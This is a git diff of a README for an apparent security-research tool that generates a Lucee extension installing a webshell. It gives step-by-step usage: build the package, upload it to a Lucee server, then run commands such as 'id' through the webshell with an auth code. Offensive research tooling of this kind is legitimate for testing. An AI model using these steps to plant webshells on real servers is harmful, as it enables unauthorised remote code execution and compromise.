@@ -1,13 +1,13 @@
 
 ## 
-
+### Generating Lucee Extension for Remote Code Execution
 ### Written by Juan Pablo Gomez (https://github.com/JPG0mez) and Will Vandevanter (https://github.com/BuffaloWill)
 
-### Building a Shell
+The work is originally based on research and a blog post here: [LINK]
 
-The blog post linked above walks through how to manually create the Lucee extension. 
+This repository includes a python script to generate a Lucee extension that will add a webshell for remote code execution.
 
-You can also use the extension-generator.py script in this repository to generate an extension for remote code execution:
+1. To use it run the `build` command:
 
 ```bash
 python3 extension-generator.py build
@@ -17,9 +17,9 @@ Generating LEX package...
 webshell/package.lex created.
 ```
 
-At this point upload `webshell/package.lex` into the Lucee installation. 
+2. Upload `webshell/package.lex` into the Lucee installation. 
 
-Then call the webshell with:
+3. Then call the webshell with:
 
 ```bash
 python3 extension-generator.py --url http://localhost:8888 --auth-code lErs2CC2BdpUtHYW0miiSNncE id
